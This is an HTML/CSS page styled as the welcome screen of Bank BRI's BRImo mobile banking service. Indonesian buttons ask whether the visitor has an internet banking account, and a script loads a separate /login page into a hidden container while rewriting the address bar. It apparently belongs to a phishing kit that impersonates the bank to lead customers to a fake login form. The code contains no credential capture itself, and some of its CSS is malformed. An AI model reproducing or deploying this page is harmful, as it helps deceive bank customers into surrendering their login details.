        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');

        body {

        .text-header {
            font-family: 'Avenir';
            color: #0086e0;
            font-weight: 800;
            font-size: 20px;
            display: block;
        }

        .text-subheader {
            font-family: 'Avenir';
            margin-top: 5px;
            color: #000;
            font-weight: 800;
        }

        .btn-punya {
            font-family: 'Avenir';
            display: block;
            margin: 80px auto 0 auto;
            padding: 0px; 
            cursor: pointer; 
            background: none rgb(0, 134, 224);
            border: none; 
            text-align: center; 
            height: 47px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 200ms ease 0s;
        }

        .btn-belum {
            font-family: 'Avenir';
            display: block;
            margin: 20px auto;
            padding: 0px; 
            cursor: pointer; 
            background: none transparent;
            border: none; 
            text-align: center; 
            height: 47px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(0, 134, 224);
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            transition: background 200ms ease 0s;
        }

        #loading {
            width: 100%;
            height: 100%;
            display: none;
            margin: auto;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0, 0.6);
            z-index: 99999;
        }

        #loading img {
            width: 40px;
            position: absolute;
            top: 43%;
            left: 0;
            right: 0;
            display: block;
            margin: auto;
        }

        #aseli {
            width: 100%;
            height: 100%;
            display: none;
            margin: auto;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 9999;
            overflow-y: scroll;
        }

    <div class="container" id="hideBody">
        <div class="row">
            <div class="col-12 d-block mx-auto text-center" style="height: 230px; width: 536px; max-width: 98%; margin-top: 40px; margin-bottom: 20px; border-radius: 0px;">

            </div>
        </div>
        <div class="fixed-bottom px-3">
            <div class="row" style="margin-bottom: -20px;">
                <div class="col-12 d-block mx-auto">
                    <div class="text-header">Selamat Datang di BRImo</div>
                    <div class="text-subheader"><font size="3">Apakah Anda memiliki akun Internet Banking Bank BRI?</font></div>
                </div>
            </div>
            <div class="row">
                <div class="col-12">
                    <button type="button" class="btn-punya">Punya Akun</button>
                </div>
                <div class="col-12">
                    <button type="button" class="btn-belum" onclick="location.href='../login';">Belum punya Akun</button>
                </div>
            </div>
            </div>
        </div>
    
    <div id="loading">
        <img src="https://cutewallpaper.org/21/loading-gif-transparent-background/Tag-For-Loading-Bar-Gif-Transparent-Loading-Gif-.gif" alt="">
    </div>
    <div id="aseli"></div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <script>
        $(document).ready(function() {
            $(".btn-punya").on('click', function() {
                $("#loading").show();
                $.get("/login/index.php", function(data, status){
                    window.history.pushState("", "", '/login');
                    setTimeout(function() { 
                        $("#hideBody").hide();
                        $("#loading").hide();
                        $("#aseli").html(data);
                        $("#aseli").show();
                    }, 1000);
                    
                });
            });
        });
    </script>
